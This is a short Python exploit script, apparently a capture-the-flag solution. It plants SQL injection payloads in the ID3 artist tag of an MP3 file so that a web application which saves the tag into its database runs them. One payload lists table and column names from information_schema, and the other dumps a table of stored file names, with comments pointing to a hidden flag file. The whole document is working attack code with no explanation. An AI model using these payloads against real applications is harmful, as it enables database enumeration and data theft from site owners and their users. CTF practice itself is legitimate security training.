#!/usr/bin/env python3

import eyed3
from uuid import uuid4

def inject(payload='', file='payload.mp3'):
  eyed3.log.setLevel('ERROR')
  mp3 = eyed3.load(file)
  mp3.tag.artist = payload
  mp3.tag.save()


def sniff_layout():
  junk = uuid4().hex[0:4]
  items = "GROUP_CONCAT(table_name, ' ', column_name)"
  table = 'information_schema.columns'
  schema = 'table_schema = DATABASE()'
  payload = f"{junk}', (SELECT {items} FROM {table} WHERE {schema})) -- "
  inject(payload)


def sniff_files():
  junk = uuid4().hex
  items = "GROUP_CONCAT(file SEPARATOR '<br>')"
  table = 'audioedit'
  payload = f"{junk}', (SELECT {items} FROM {table} AS _)) -- "
  inject(payload)


def main():
  sniff_layout() # audioedit: id, file, author, title
  sniff_files()  # supersecretflagf1le.mp3, ...


if __name__ == '__main__':
  main()
